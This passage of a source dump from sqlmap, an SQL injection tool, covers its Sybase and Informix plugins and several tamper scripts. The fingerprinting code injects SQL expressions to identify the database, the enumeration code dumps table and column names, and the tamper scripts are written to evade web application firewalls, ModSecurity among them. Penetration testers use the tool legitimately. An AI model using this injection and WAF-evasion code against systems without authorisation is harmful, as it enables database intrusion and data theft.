kb.data.cachedDbs\n\n    def getTables(self, bruteForce=None):\n        if len(kb.data.cachedTables) > 0:\n            return kb.data.cachedTables\n\n        self.forceDbmsEnum()\n\n        if conf.db == CURRENT_DB:\n            conf.db = self.getCurrentDb()\n\n        if conf.db:\n            dbs = conf.db.split(',')\n        else:\n            dbs = self.getDbs()\n\n        for db in dbs:\n            dbs[dbs.index(db)] = safeSQLIdentificatorNaming(db)\n\n        dbs = [_ for _ in dbs if _]\n\n        infoMsg = \"fetching tables for database\"\n        infoMsg += \"%s: %s\" % (\"s\" if len(dbs) > 1 else \"\", \", \".join(db if isinstance(db, six.string_types) else db[0] for db in sorted(dbs)))\n        logger.info(infoMsg)\n\n        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n            blinds = [False, True]\n        else:\n            blinds = [True]\n\n        rootQuery = queries[DBMS.SYBASE].tables\n\n        for db in dbs:\n            for blind in blinds:\n                query = rootQuery.inband.query % db\n                retVal = pivotDumpTable(\"(%s) AS %s\" % (query, kb.aliasName), ['%s.name' % kb.aliasName], blind=blind, alias=kb.aliasName)\n\n                if retVal:\n                    for table in next(six.itervalues(retVal[0])):\n                        if db not in kb.data.cachedTables:\n                            kb.data.cachedTables[db] = [table]\n                        else:\n                            kb.data.cachedTables[db].append(table)\n                    break\n\n        for db, tables in kb.data.cachedTables.items():\n            kb.data.cachedTables[db] = sorted(tables) if tables else tables\n\n        return kb.data.cachedTables\n\n    def getColumns(self, onlyColNames=False, colTuple=None, bruteForce=None, dumpMode=False):\n        self.forceDbmsEnum()\n\n        if conf.db is None or conf.db == CURRENT_DB:\n            if conf.db is None:\n                warnMsg = \"missing database parameter. sqlmap is going \"\n                warnMsg += \"to use the current database to enumerate \"\n                warnMsg += \"table(s) columns\"\n                logger.warning(warnMsg)\n\n            conf.db = self.getCurrentDb()\n\n        elif conf.db is not None:\n            if ',' in conf.db:\n                errMsg = \"only one database name is allowed when enumerating \"\n                errMsg += \"the tables' columns\"\n                raise SqlmapMissingMandatoryOptionException(errMsg)\n\n        conf.db = safeSQLIdentificatorNaming(conf.db)\n\n        if conf.col:\n            colList = conf.col.split(',')\n        else:\n            colList = []\n\n        if conf.exclude:\n            colList = [_ for _ in colList if re.search(conf.exclude, _, re.I) is None]\n\n        for col in colList:\n            colList[colList.index(col)] = safeSQLIdentificatorNaming(col)\n\n        if conf.tbl:\n            tblList = conf.tbl.split(',')\n        else:\n            self.getTables()\n\n            if len(kb.data.cachedTables) > 0:\n                tblList = list(six.itervalues(kb.data.cachedTables))\n\n                if tblList and isListLike(tblList[0]):\n                    tblList = tblList[0]\n            else:\n                errMsg = \"unable to retrieve the tables \"\n                errMsg += \"on database '%s'\" % unsafeSQLIdentificatorNaming(conf.db)\n                raise SqlmapNoneDataException(errMsg)\n\n        for tbl in tblList:\n            tblList[tblList.index(tbl)] = safeSQLIdentificatorNaming(tbl, True)\n\n        if bruteForce:\n            resumeAvailable = False\n\n            for tbl in tblList:\n                for db, table, colName, colType in kb.brute.columns:\n                    if db == conf.db and table == tbl:\n                        resumeAvailable = True\n                        break\n\n            if resumeAvailable and not conf.freshQueries or colList:\n                columns = {}\n\n                for column in colList:\n                    columns[column] = None\n\n                for tbl in tblList:\n                    for db, table, colName, colType in kb.brute.columns:\n                        if db == conf.db and table == tbl:\n                            columns[colName] = colType\n\n                    if conf.db in kb.data.cachedColumns:\n                        kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)][safeSQLIdentificatorNaming(tbl, True)] = columns\n                    else:\n                        kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)] = {safeSQLIdentificatorNaming(tbl, True): columns}\n\n                return kb.data.cachedColumns\n\n            message = \"do you want to use common column existence check? [y/N/q] \"\n            choice = readInput(message, default='Y' if 'Y' in message else 'N').upper()\n\n            if choice == 'N':\n                return\n            elif choice == 'Q':\n                raise SqlmapUserQuitException\n            else:\n                return columnExists(paths.COMMON_COLUMNS)\n\n        rootQuery = queries[DBMS.SYBASE].columns\n\n        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n            blinds = [False, True]\n        else:\n            blinds = [True]\n\n        for tbl in tblList:\n            if conf.db is not None and len(kb.data.cachedColumns) > 0 \\\n               and conf.db in kb.data.cachedColumns and tbl in \\\n               kb.data.cachedColumns[conf.db]:\n                infoMsg = \"fetched tables' columns on \"\n                infoMsg += \"database '%s'\" % unsafeSQLIdentificatorNaming(conf.db)\n                logger.info(infoMsg)\n\n                return {conf.db: kb.data.cachedColumns[conf.db]}\n\n            if dumpMode and colList:\n                table = {}\n                table[safeSQLIdentificatorNaming(tbl, True)] = dict((_, None) for _ in colList)\n                kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)] = table\n                continue\n\n            infoMsg = \"fetching columns \"\n            infoMsg += \"for table '%s' \" % unsafeSQLIdentificatorNaming(tbl)\n            infoMsg += \"on database '%s'\" % unsafeSQLIdentificatorNaming(conf.db)\n            logger.info(infoMsg)\n\n            for blind in blinds:\n                query = rootQuery.inband.query % (conf.db, conf.db, conf.db, conf.db, conf.db, conf.db, conf.db, unsafeSQLIdentificatorNaming(tbl))\n                retVal = pivotDumpTable(\"(%s) AS %s\" % (query, kb.aliasName), ['%s.name' % kb.aliasName, '%s.usertype' % kb.aliasName], blind=blind, alias=kb.aliasName)\n\n                if retVal:\n                    table = {}\n                    columns = {}\n\n                    for name, type_ in filterPairValues(_zip(retVal[0][\"%s.name\" % kb.aliasName], retVal[0][\"%s.usertype\" % kb.aliasName])):\n                        columns[name] = SYBASE_TYPES.get(int(type_) if hasattr(type_, \"isdigit\") and type_.isdigit() else type_, type_)\n\n                    table[safeSQLIdentificatorNaming(tbl, True)] = columns\n                    kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)] = table\n\n                    break\n\n        return kb.data.cachedColumns\n\n    def searchDb(self):\n        warnMsg = \"on Sybase searching of databases is not implemented\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchTable(self):\n        warnMsg = \"on Sybase searching of tables is not implemented\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchColumn(self):\n        warnMsg = \"on Sybase searching of columns is not implemented\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def search(self):\n        warnMsg = \"on Sybase search option is not available\"\n        logger.warning(warnMsg)\n\n    def getHostname(self):\n        warnMsg = \"on Sybase it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n\n    def getStatements(self):\n        warnMsg = \"on Sybase it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n", "plugins/dbms/sybase/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import _mssql\n    import pymssql\nexcept:\n    pass\n\nimport logging\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.convert import getText\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: http://pymssql.sourceforge.net/\n    User guide: http://pymssql.sourceforge.net/examples_pymssql.php\n    API: http://pymssql.sourceforge.net/ref_pymssql.php\n    Debian package: python-pymssql\n    License: LGPL\n\n    Possible connectors: http://wiki.python.org/moin/SQL%20Server\n\n    Important note: pymssql library on your system MUST be version 1.0.2\n    to work, get it from http://sourceforge.net/projects/pymssql/files/pymssql/1.0.2/\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n\n        try:\n            self.connector = pymssql.connect(host=\"%s:%d\" % (self.hostname, self.port), user=self.user, password=self.password, database=self.db, login_timeout=conf.timeout, timeout=conf.timeout)\n        except (pymssql.Error, _mssql.MssqlDatabaseException) as ex:\n            raise SqlmapConnectionException(ex)\n        except ValueError:\n            raise SqlmapConnectionException\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except (pymssql.Error, _mssql.MssqlDatabaseException) as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) '%s'\" % getSafeExString(ex).replace(\"\\n\", \" \"))\n            return None\n\n    def execute(self, query):\n        retVal = False\n\n        try:\n            self.cursor.execute(getText(query))\n            retVal = True\n        except (pymssql.OperationalError, pymssql.ProgrammingError) as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) '%s'\" % getSafeExString(ex).replace(\"\\n\", \" \"))\n        except pymssql.InternalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        return retVal\n\n    def select(self, query):\n        retVal = None\n\n        if self.execute(query):\n            retVal = self.fetchall()\n\n            try:\n                self.connector.commit()\n            except pymssql.OperationalError:\n                pass\n\n        return retVal\n", "plugins/dbms/sybase/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHAR(97)+CHAR(98)+CHAR(99)+CHAR(100)+CHAR(101)+CHAR(102)+CHAR(103)+CHAR(104) FROM foobar\"\n        True\n        >>> Syntax.escape(u\"SELECT 'abcd\\xebfgh' FROM foobar\") == \"SELECT CHAR(97)+CHAR(98)+CHAR(99)+CHAR(100)+TO_UNICHAR(235)+CHAR(102)+CHAR(103)+CHAR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"+\".join(\"%s(%d)\" % (\"CHAR\" if _ < 128 else \"TO_UNICHAR\", _) for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/sybase/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.compat import xrange\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import OS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import SYBASE_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.SYBASE)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.SYBASE\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(SYBASE_ALIASES):\n            setDbms(\"%s %s\" % (DBMS.SYBASE, Backend.getVersion()))\n\n            self.getBanner()\n\n            Backend.setOs(OS.WINDOWS)\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.SYBASE\n        logger.info(infoMsg)\n\n        if conf.direct:\n            result = True\n        else:\n            result = inject.checkBooleanExpression(\"@@transtate=@@transtate\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.SYBASE\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"suser_id()=suser_id()\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.SYBASE\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.SYBASE)\n\n            self.getBanner()\n\n            if not conf.extensiveFp:\n                return True\n\n            infoMsg = \"actively fingerprinting %s\" % DBMS.SYBASE\n            logger.info(infoMsg)\n\n            result = unArrayizeValue(inject.getValue(\"SUBSTRING(@@VERSION,1,1)\"))\n\n            if result and result.isdigit():\n                Backend.setVersion(str(result))\n            else:\n                for version in xrange(12, 16):\n                    result = inject.checkBooleanExpression(\"PATINDEX('%%/%d[./]%%',@@VERSION)>0\" % version)\n\n                    if result:\n                        Backend.setVersion(str(version))\n                        break\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.SYBASE\n            logger.warning(warnMsg)\n\n            return False\n", "plugins/dbms/sybase/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Sybase it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on Sybase it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on Sybase it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on Sybase it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/sybase/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on Sybase it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on Sybase it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/sybase/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import SYBASE_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.sybase.enumeration import Enumeration\nfrom plugins.dbms.sybase.filesystem import Filesystem\nfrom plugins.dbms.sybase.fingerprint import Fingerprint\nfrom plugins.dbms.sybase.syntax import Syntax\nfrom plugins.dbms.sybase.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass SybaseMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines Sybase methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = SYBASE_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.SYBASE] = Syntax.escape\n", "plugins/dbms/informix/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def searchDb(self):\n        warnMsg = \"on Informix searching of databases is not implemented\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchTable(self):\n        warnMsg = \"on Informix searching of tables is not implemented\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchColumn(self):\n        warnMsg = \"on Informix searching of columns is not implemented\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def search(self):\n        warnMsg = \"on Informix search option is not available\"\n        logger.warning(warnMsg)\n\n    def getStatements(self):\n        warnMsg = \"on Informix it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n", "plugins/dbms/informix/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import ibm_db_dbi\nexcept:\n    pass\n\nimport logging\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/ibmdb/python-ibmdb\n    User guide: https://github.com/ibmdb/python-ibmdb/wiki/README\n    API: https://www.python.org/dev/peps/pep-0249/\n    License: Apache License 2.0\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n\n        try:\n            database = \"DATABASE=%s;HOSTNAME=%s;PORT=%s;PROTOCOL=TCPIP;\" % (self.db, self.hostname, self.port)\n            self.connector = ibm_db_dbi.connect(database, self.user, self.password)\n        except ibm_db_dbi.OperationalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except ibm_db_dbi.ProgrammingError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        try:\n            self.cursor.execute(query)\n        except (ibm_db_dbi.OperationalError, ibm_db_dbi.ProgrammingError) as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n        except ibm_db_dbi.InternalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.connector.commit()\n\n    def select(self, query):\n        self.execute(query)\n        return self.fetchall()\n", "plugins/dbms/informix/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.common import isDBMSVersionAtLeast\nfrom lib.core.common import randomStr\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> from lib.core.common import Backend\n        >>> Backend.setVersion('12.10')\n        ['12.10']\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"||\".join(\"CHR(%d)\" % _ for _ in getOrds(value))\n\n        retVal = expression\n\n        if isDBMSVersionAtLeast(\"11.70\"):\n            excluded = {}\n            for _ in re.findall(r\"DBINFO\\([^)]+\\)\", expression):\n                excluded[_] = randomStr()\n                expression = expression.replace(_, excluded[_])\n\n            retVal = Syntax._escape(expression, quote, escaper)\n\n            for _ in excluded.items():\n                retVal = retVal.replace(_[1], _[0])\n\n        return retVal\n", "plugins/dbms/informix/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import INFORMIX_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.INFORMIX)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.INFORMIX\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(INFORMIX_ALIASES):\n            setDbms(DBMS.INFORMIX)\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.INFORMIX\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"[RANDNUM]=(SELECT [RANDNUM] FROM SYSMASTER:SYSDUAL)\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.INFORMIX\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"(SELECT DBINFO('DBNAME') FROM SYSMASTER:SYSDUAL) IS NOT NULL\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.INFORMIX\n                logger.warning(warnMsg)\n\n                return False\n\n            # Determine if it is Informix >= 11.70\n            if inject.checkBooleanExpression(\"CHR(32)=' '\"):\n                Backend.setVersion(\">= 11.70\")\n\n            setDbms(DBMS.INFORMIX)\n\n            self.getBanner()\n\n            if not conf.extensiveFp:\n                return True\n\n            infoMsg = \"actively fingerprinting %s\" % DBMS.INFORMIX\n            logger.info(infoMsg)\n\n            for version in (\"14.1\", \"12.1\", \"11.7\", \"11.5\", \"10.0\"):\n                output = inject.checkBooleanExpression(\"EXISTS(SELECT 1 FROM SYSMASTER:SYSDUAL WHERE DBINFO('VERSION,'FULL') LIKE '%%%s%%')\" % version)\n\n                if output:\n                    Backend.setVersion(version)\n                    break\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.INFORMIX\n            logger.warning(warnMsg)\n\n            return False\n", "plugins/dbms/informix/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def __init__(self):\n        self.__basedir = None\n        self.__datadir = None\n\n        GenericTakeover.__init__(self)\n", "plugins/dbms/informix/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    pass\n", "plugins/dbms/informix/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import INFORMIX_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\n\nfrom plugins.dbms.informix.enumeration import Enumeration\nfrom plugins.dbms.informix.filesystem import Filesystem\nfrom plugins.dbms.informix.fingerprint import Fingerprint\nfrom plugins.dbms.informix.syntax import Syntax\nfrom plugins.dbms.informix.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass InformixMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines Informix methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = INFORMIX_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.INFORMIX] = Syntax.escape\n", "tamper/equaltorlike.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces all occurrences of operator equal ('=') with 'RLIKE' counterpart\n\n    Tested against:\n        * MySQL 4, 5.0 and 5.5\n\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls that\n          filter the equal character ('=')\n\n    >>> tamper('SELECT * FROM users WHERE id=1')\n    'SELECT * FROM users WHERE id RLIKE 1'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"\\s*=\\s*\", \" RLIKE \", retVal)\n\n    return retVal\n", "tamper/least.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces greater than operator ('>') with 'LEAST' counterpart\n\n    Tested against:\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls that\n          filter the greater than character\n        * The LEAST clause is a widespread SQL command. Hence, this\n          tamper script should work against majority of databases\n\n    >>> tamper('1 AND A > B')\n    '1 AND LEAST(A,B+1)=B+1'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        match = re.search(r\"(?i)(\\b(AND|OR)\\b\\s+)([^>]+?)\\s*>\\s*(\\w+|'[^']+')\", payload)\n\n        if match:\n            _ = \"%sLEAST(%s,%s+1)=%s+1\" % (match.group(1), match.group(3), match.group(4), match.group(4))\n            retVal = retVal.replace(match.group(0), _)\n\n    return retVal\n", "tamper/modsecurityzeroversioned.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHER\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Embraces complete query with (MySQL) zero-versioned comment\n\n    Requirement:\n        * MySQL\n\n    Tested against:\n        * MySQL 5.0\n\n    Notes:\n        * Useful to bypass ModSecurity WAF\n\n    >>> tamper('1 AND 2>1--')\n    '1 /*!00000AND 2>1*/--'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        postfix = ''\n        for comment in ('#', '--', '/*'):\n            if comment in payload:\n                postfix = payload[payload.find(comment):]\n                payload = payload[:payload.find(comment)]\n                break\n        if ' ' in payload:\n            retVal = \"%s /*!00000%s*/%s\" % (payload[:payload.find(' ')], payload[payload.find(' ') + 1:], postfix)\n\n    return retVal\n", "tamper/space2plus.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with plus ('+')\n\n    Notes:\n        * Is this any useful? The plus get's url-encoded by sqlmap engine invalidating the query afterwards\n        * This tamper script works against all databases\n\n    >>> tamper('SELECT id FROM users')\n    'SELECT+id+FROM+users'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += \"+\"\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += \"+\"\n                continue\n\n            retVal += payload[i]\n\n    return retVal\n", "tamper/space2mssqlblank.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 